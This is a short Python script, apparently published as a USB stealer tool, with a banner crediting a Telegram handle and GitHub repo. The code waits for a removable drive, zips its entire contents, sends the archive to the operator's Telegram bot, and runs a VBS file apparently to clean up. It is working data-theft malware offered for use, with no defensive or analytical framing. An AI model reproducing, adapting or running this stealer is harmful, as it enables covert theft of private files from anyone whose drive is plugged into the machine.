"""
telegram :: https://t.me/sblro4eeek
github :: https://github.com/sblro4eeek/Usb_Stealer_tg

      _     _          _  _                 _    
     | |   | |        | || |               | |   
  ___| |__ | |_ __ ___| || |_ ___  ___  ___| | __
 / __| '_ \| | '__/ _ \__   _/ _ \/ _ \/ _ \ |/ /
 \__ \ |_) | | | | (_) | | ||  __/  __/  __/   < 
 |___/_.__/|_|_|  \___/  |_| \___|\___|\___|_|\_\
                                                 
                                                 
    Copyleft 2022 https://t.me/sblro4eeek
    This code is free software
    You can edit this module, 
    but when editing, credit the author and yourself
"""
import win32api as wa
import win32file as wf

import os
import shutil

import telebot
 
DRIVE_REMOVABLE = 2
token = 'Ваш_токен_бота'
me = 'Ваш_айди'
bot = telebot.TeleBot(token)

def zip(usb):
	shutil.make_archive("logs", 'zip', usb)
	send_zip()

def send_zip():
	bot.send_document(int(me), open('logs.zip', 'rb'))
	clear()

def clear():
	os.system('Analisys.vbs')

connect = True 
while connect:
	disk = wa.GetLogicalDriveStrings()
	disk = disk.split('\000')[:-1]

	for usb in disk:
	    if wf.GetDriveTypeW(usb) == DRIVE_REMOVABLE:
	    	zip(usb=usb)
	    	connect = False
